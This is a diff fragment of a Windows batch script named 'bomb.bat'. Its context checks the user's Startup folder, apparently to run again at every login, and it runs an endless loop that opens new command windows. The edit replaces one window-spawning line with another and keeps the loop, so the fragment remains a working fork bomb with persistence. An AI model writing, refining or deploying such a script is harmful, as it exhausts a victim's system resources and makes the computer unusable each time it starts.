@@ -9,7 +9,6 @@ if not exist "%StartupFolder%\bomb.bat" (
 )
 
 :loop
-start cmd /k :loop & start cmd & goto loop
+start cmd /k start cmd
 
 goto loop
-
